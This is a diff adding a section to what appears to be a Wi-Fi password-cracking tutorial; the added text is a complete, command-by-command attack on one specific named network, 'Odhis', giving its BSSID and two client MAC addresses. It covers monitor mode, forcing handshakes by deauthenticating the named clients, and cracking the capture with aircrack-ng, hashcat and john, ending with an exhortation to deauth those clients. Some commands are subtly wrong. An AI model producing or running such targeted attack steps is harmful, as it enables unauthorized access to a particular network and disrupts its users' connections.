@@ -244,6 +244,133 @@ cap2hccapx.bin capture/-01.cap capture/-01.hccapx
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 ```
 
+Complete Attack Sequence:
+Step 1: Start monitor mode
+bash
+
+# Stop NetworkManager and start monitor mode
+sudo systemctl stop NetworkManager
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Verify
+iwconfig
+
+Step 2: Capture handshake
+bash
+
+# Create directory for capture files
+mkdir -p ~/wifi-capture && cd ~/wifi-capture
+
+# Start capturing on channel 5, targeting Odhis network
+sudo airodump-ng -c 5 --bssid A0:36:78:C7:25:0C -w odhis_capture wlan0mon
+
+Leave this terminal running!
+Step 3: Open new terminal and force handshake
+bash
+
+# In a NEW terminal tab/window
+cd ~/wifi-capture
+
+# Send deauth packets to capture handshake
+sudo aireplay-ng -0 10 -a A0:36:78:C7:25:0C wlan0mon
+
+# Or target specific client (more effective)
+sudo aireplay-ng -0 10 -a A0:36:78:C7:25:0C -c 66:4C:22:70:1B:DA wlan0mon
+# Or
+sudo aireplay-ng -0 10 -a A0:36:78:C7:25:0C -c FA:AF:E5:CC:25:E4 wlan0mon
+
+Step 4: Check for captured handshake
+
+In the first terminal (airodump), look for "WPA handshake: A0:36:78:C7:25:0C" in the top right corner. Once you see it, press Ctrl+C to stop capturing.
+Step 5: Restore connection
+bash
+
+# In the first terminal (or a new one)
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+
+# Wait a moment
+sleep 5
+
+# Reconnect to Odhis
+sudo nmcli connection up "Odhis"
+
+Step 6: Download wordlist (if needed)
+bash
+
+# Small wordlist for testing (or use your own)
+cd ~/wifi-capture
+
+# Option 1: Download rockyou (if you have enough space)
+sudo apt update
+sudo apt install wordlists
+cp /usr/share/wordlists/rockyou.txt.gz .
+gunzip rockyou.txt.gz
+
+# Option 2: Create custom wordlist
+echo -e "password\n123456\nqwerty\nodhis\nodhis123\nadmin" > custom.txt
+
+Step 7: Crack the password
+bash
+
+cd ~/wifi-capture
+
+# Try with a custom wordlist first
+aircrack-ng -w custom.txt odhis_capture-01.cap
+
+# If that doesn't work, use rockyou
+aircrack-ng -w rockyou.txt odhis_capture-01.cap
+
+# For faster cracking, specify BSSID
+aircrack-ng -b A0:36:78:C7:25:0C -w rockyou.txt odhis_capture-01.cap
+
+Troubleshooting Tips:
+
+    If handshake not captured:
+
+        Send more deauth packets: sudo aireplay-ng -0 20 -a A0:36:78:C7:25:0C wlan0mon
+
+        Wait for client activity (better when clients are active)
+
+    If reconnection fails:
+    bash
+
+# Manually reconnect
+sudo nmcli device wifi connect "Odhis"
+# Or
+sudo wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf
+
+To monitor progress while capturing:
+bash
+
+# Watch for handshake in real-time
+watch -n 1 "tail -n 20 odhis_capture-01.cap"
+
+Alternative cracking tools:
+bash
+
+# Using hashcat (faster with GPU)
+aircrack-ng -J odhis_hash odhis_capture-01.cap
+hashcat -m 2500 odhis_hash.hccapx rockyou.txt
+
+# Using john the ripper
+aircrack-ng -J odhis_hash odhis_capture-01.cap
+john --format=wpapsk odhis_hash.hccapx --wordlist=rockyou.txt
+
+Quick One-liner to restart:
+
+If something goes wrong:
+bash
+
+sudo airmon-ng stop wlan0mon 2>/dev/null; sudo systemctl restart NetworkManager; sleep 3; sudo nmcli connection up "Odhis"
+
+Note: The success of capturing the handshake depends on whether there are active clients on the network. The clients 66:4C:22:70:1B:DA and FA:AF:E5:CC:25:E4 are connected to Odhis, so target them with deauth!
+
+
+
+
+
 ## Appendix
 
 The response to this tutorial was so great that I've added suggestions and additional material from community members as an [appendix](appendix.md). Check it out to learn how to:
